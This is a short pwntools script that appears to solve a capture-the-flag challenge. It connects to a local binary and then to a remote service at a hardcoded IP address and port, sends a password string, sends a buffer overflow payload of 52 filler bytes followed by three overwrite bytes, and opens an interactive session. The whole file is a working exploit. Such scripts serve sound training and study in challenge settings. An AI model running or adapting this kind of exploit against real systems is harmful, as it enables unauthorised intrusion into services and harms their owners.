from pwn import *

p = process("./task3_file")
p = remote("62.173.140.174", 17200)
p.sendlineafter(b"What do you think?\n", b"CODEBY_Secret_Base")
payload = b"a" * 52 + p8(0xdb) + p8(0xbc) + p8(0xed)
p.sendlineafter(b"Well, you passed the first test.\n", payload)


p.interactive()
